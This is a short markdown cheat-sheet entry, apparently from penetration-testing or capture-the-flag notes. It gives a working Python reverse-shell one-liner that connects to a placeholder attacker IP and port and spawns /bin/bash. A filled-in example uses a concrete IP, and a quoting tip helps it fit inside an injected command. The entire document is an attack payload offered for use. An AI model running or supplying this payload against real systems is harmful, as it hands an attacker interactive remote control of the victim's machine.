## Python Reverse Shell

> Note: single quotes were avoided so that it can be wrapped in `'`${SHELL}`'`

Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:

```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ATTACKER_IP}\",${ATTACKER_LISTENER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

e.g.

```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.163\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```